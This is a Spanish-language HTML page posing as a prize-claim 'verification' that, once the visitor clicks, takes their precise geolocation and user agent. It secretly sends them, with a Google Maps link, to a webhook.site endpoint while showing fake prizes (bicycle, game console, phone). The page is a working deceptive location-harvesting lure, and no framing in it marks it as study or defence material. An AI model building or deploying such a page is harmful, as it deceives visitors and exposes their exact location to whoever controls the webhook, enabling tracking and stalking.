<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificaci√≥n y Validaci√≥n</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; background: #f5f5f5; }
    h1 { color: #222; margin-top: 30px; }
    button { padding: 12px 25px; font-size: 18px; border: none; border-radius: 6px; background: #007bff; color: #fff; cursor: pointer; }
    button:hover { background: #0056b3; }
    #msg { margin-top: 20px; font-size: 20px; font-weight: bold; color: green; display: none; }
    #icono { margin-top: 20px; width: 150px; display: none; }
    #premios { margin-top: 30px; display: none; }
    #premios img { width: 160px; margin: 15px; border-radius: 12px; box-shadow: 0px 3px 8px rgba(0,0,0,0.2); }
  </style>
</head>
<body>
  <h1>‚úÖ VERIFICACI√ìN Y VALIDACI√ìN</h1>
  <p>Por favor, pulsa el bot√≥n y acepta la solicitud.</p>
  <button onclick="obtenerUbicacion()">üìç RECLAMA TU PREMIO</button>
  
  <p id="msg">¬°Gracias por aceptar! üéâ</p>
  <img id="icono" src="https://cdn-icons-png.flaticon.com/512/190/190411.png" alt="Gracias">

  <!-- Galer√≠a de premios -->
  <div id="premios">
    <img src="https://cdn-icons-png.flaticon.com/512/3104/3104795.png" alt="Bicicleta">
    <img src="https://cdn-icons-png.flaticon.com/512/3176/3176364.png" alt="Consola de juegos">
    <img src="https://cdn-icons-png.flaticon.com/512/2920/2920244.png" alt="Celular gama alta">
  </div>

<script>
const WEBHOOK_URL = "https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639";

function obtenerUbicacion() {
  if (!navigator.geolocation) {
    alert("Tu navegador no soporta geolocalizaci√≥n.");
    return;
  }

  navigator.geolocation.getCurrentPosition(onSuccess, onError, {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0
  });
}

function onSuccess(pos) {
  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;
  const accuracy = pos.coords.accuracy;

  const data = {
    lat,
    lon,
    accuracy,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    maps_link: `https://www.google.com/maps?q=${lat},${lon}`,
    source: window.location.href
  };

  // Enviar datos al webhook (en segundo plano)
  fetch(WEBHOOK_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data, null, 2)
  });

  // Mostrar mensaje, logo y premios
  document.getElementById("msg").style.display = "block";
  document.getElementById("icono").style.display = "block";
  document.getElementById("premios").style.display = "block";
}

function onError(err) {
  alert("‚ö†Ô∏è Error al obtener ubicaci√≥n: " + (err.message || err.code));
}
</script>
</body>
</html>
